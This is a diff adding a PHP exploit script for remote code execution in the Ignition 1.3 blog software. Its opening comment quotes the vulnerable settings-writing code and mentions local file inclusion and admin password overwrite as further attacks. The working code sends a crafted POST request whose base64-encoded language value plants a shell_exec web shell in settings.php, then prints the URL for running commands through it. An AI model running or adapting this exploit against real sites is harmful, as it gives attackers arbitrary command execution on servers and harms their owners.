@@ -1,0 +1,88 @@
+<?php
+
+/*
+
+Ignition 1.3 Remote Code Execution Exploit
+by cOndemned
+download: http://launchpad.net/ignition/trunk/1.3/+download/ignition-1.3.tar.gz
+
+
+source of i-options.php
+
+	1.	<?php
+	2.	session_start();
+	3.	if ($_POST['submit']) {
+	4.	if ($FH = @fopen('data/settings.php', 'w')) {
+	5.		@fwrite($FH, '<?php $pass = "'.$_POST['pass'].'";
+	6.	$uri = "'.$_POST['uri'].'";
+	7.	$suri = "'.$_POST['suri'].'";
+	8.	$blogtitle = "'.$_POST['title'].'";
+	9.	$description = "'.$_POST['description'].'";
+	10.	$postid = "'.$_POST['id'].'";
+	11.	$author = "'.$_POST['author'].'";
+	12.	$skin = "'.$_POST['skin'].'";
+	13.	$gravatar = "'.$_POST['gravatar'].'";
+	14.	$twitter = "' . $_POST['twitter'] . '";
+	15.	$identica = "' . $_POST['identica'] . '";
+	16.	$book = "' . $_POST['book'] . '";
+	17.	$game = "' . $_POST['game'] . '";
+	18.	$language = "' . $_POST['lang'] . '";
+	19.	
+	20.	require_once("template.php");
+	21.	require_once("lang/$language.php");');
+	22.		#fclose($FH);
+	23.	}
+
+We can overwrite setting.php by simply sending specially crafted POST request, 
+and put some evil code into one of the variables. After running my PoC line with
+$language var will be:
+
+	$language = "en";echo @shell_exec($_GET['cmd']);$wtf="";
+
+Where "en" is default language and without filling this field correctly admin 
+will see error while trying to access blog index. 
+
+other attacks scenarios:
+
+	- attacker can use $_POST['language'] variable to exploit Local File 
+	Inclusion (lines 18 and 21)
+
+	- fill $_POST['pass'] with new password (md5 hashed) to overwrite admins
+	password
+
+	- etc...
+*/
+
+
+$target = 'http://localhost/ignition/';
+
+$post = array
+(
+	'uri'		=> $target,
+	'suri'		=> $target,
+	'description'	=> 'Just another lame php blog script owned :<',
+	'skin'		=> 'default',
+	'lang'		=> base64_decode('ZW4iO2VjaG8gQHNoZWxsX2V4ZWMoJF9HRVRbJ2NtZCddKTskd3RmPSI='),
+	'submit'	=> 1
+);
+
+$sock = curl_init();
+
+curl_setopt_array
+(
+	$sock, 
+	array
+	(
+		CURLOPT_URL 		=> "$target/i-options.php",
+		CURLOPT_RETURNTRANSFER	=> true,
+		CURLOPT_POST		=> true,
+		CURLOPT_POSTFIELDS	=> http_build_query($post)
+	)
+);
+
+curl_exec($sock);
+curl_close($sock);
+
+echo "Check: $target/data/settings.php?cmd=[system_command]";
+
+?>
